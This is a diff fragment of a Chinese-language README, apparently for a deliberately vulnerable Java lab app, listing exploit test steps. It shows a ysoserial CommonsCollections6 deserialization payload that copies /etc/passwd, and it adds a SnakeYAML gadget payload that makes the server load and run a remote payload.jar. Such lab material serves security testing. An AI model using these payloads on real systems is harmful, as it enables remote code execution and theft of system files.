@@ -39,3 +39,10 @@
    ysoserial CommonsCollections6 "cp /etc/passwd /tmp" > test
    curl 127.0.0.1:8080/object/parse --data-binary @test -H 'Content-Type: text/plain'
    ```
+11. 测试snake yaml漏洞
+   ```
+   curl 127.0.0.1:8080/snakeyaml/parse -d 'yaml=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/payload.jar"]]]]'
+   ```
+
+
+
